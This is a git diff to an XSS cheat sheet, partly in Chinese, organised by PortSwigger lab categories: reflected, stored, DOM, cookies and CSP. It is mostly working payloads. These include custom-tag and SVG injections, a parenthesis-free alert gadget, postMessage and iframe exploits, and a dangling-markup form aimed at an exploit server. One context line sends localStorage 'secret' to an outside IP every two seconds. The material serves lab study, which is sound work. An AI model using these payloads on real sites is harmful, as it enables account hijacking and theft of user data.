@@ -7,7 +7,7 @@
 ```
 
 ```javascript
-<script>alert(233)</script>
+<script>alert(xiaofeixia)</script>
 ```
 
 ```javascript
@@ -29,39 +29,6 @@
 '-alert(document.domain)-'
 ';alert(document.domain)//
 ```
-*custom tags*
-
-```html
-<script>
-location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-</script>
-```
-```html
-<script>
-location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
-</script>
-```
-
-*SVG markup allowed*
-
-```html
-?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
-```
-```html
-?search="><svg><animatetransform onbegin=alert(1)>
-```
-*canonical link tag*
-
-```html
-/?%27accesskey=%27x%27onclick=%27alert(1)
-```
-```html
-/?'accesskey='x'onclick='alert(1)
-```
-- On Windows/Linux(Chrome): `ALT+Key`
-- On Windows/Linux(Firefox): `Alt+Shift+key`
-- On MacOS: `CTRL+Option+X`
-
 *JavaScript string with single quote and backslash escaped*
 
 ```html
@@ -73,9 +40,44 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfoc
 ```html
 \'-alert(2333)//
 ```
+*custom tags*
+
+```html
+<script>
+location = 'https://vulnerable-website.com/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+</script>
+```
+
+*SVG markup allowed*
+
+```html
+?search="><svg><animatetransform onbegin=alert(1)>
+```
+*canonical link tag*
+
+```html
+/?'accesskey='x'onclick='alert(1)
+```
+- On Windows/Linux(Chrome): `ALT+Key`
+- On Windows/Linux(Firefox): `Alt+Shift+key`
+- On MacOS: `CTRL+Option+X`
+
 *JavaScript template literals*
 ```html
-${alert(document.domain)}
+`${alert(document.domain)}`
+```
+
+*event handlers and `href` attributes blocked*
+```html
+<a href="javascript:alert(233)">click me</a>
+```
+```html
+<svg><a><animate attributeName=href values=javascript:alert(233) /><text x=20 y=20>Click me</text></a>
+```
+
+*在不直接使用括号 () 的情况下执行 alert(1337)*
+```html
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 ```
 
 ## stored
@@ -89,7 +91,7 @@ ${alert(document.domain)}
 *`onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped, `&apos;`*
 
 ```html
-&apos;-alert(2333)-&apos;
+?&apos;-alert(2333)-&apos;
 ```
 
 ## DOM
@@ -138,12 +140,17 @@ javascript:alert(233)
 
 *reflected XSS vulnerability in the search functionality*
 ```html
-<iframe src="https://vulnerable-website.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>
 ```
 
 *jQuery selector sink using a hashchange event*
 ```html
 <iframe src="https://vulnerable-website.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+*DOM XSS using web messages*
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
 ```
 
 ## cookies
@@ -268,3 +275,19 @@ body:username.value+':'+this.value
 <img src="x" onerror="setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
 ```
 ---
+
+## CSP
+
+[CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) 内容安全策略（Content Security Policy，简称 CSP） 是一种声明式的安全机制，主要用于检测并缓解网页中的特定类型攻击，尤其是 跨站脚本攻击（XSS） 和 数据注入攻击。
+
+通过配置 CSP，网站管理员可以限制浏览器能够为该页面加载哪些资源（如 JavaScript、CSS、图片、字体等），以及这些资源可以从哪些可信的源加载。
+
+*[Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)*
+
+```html
+?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="GET">Click me</button>
+```
+
+::: details HtmlInjection.html
+<<< ./html/HtmlInjection.html
+:::
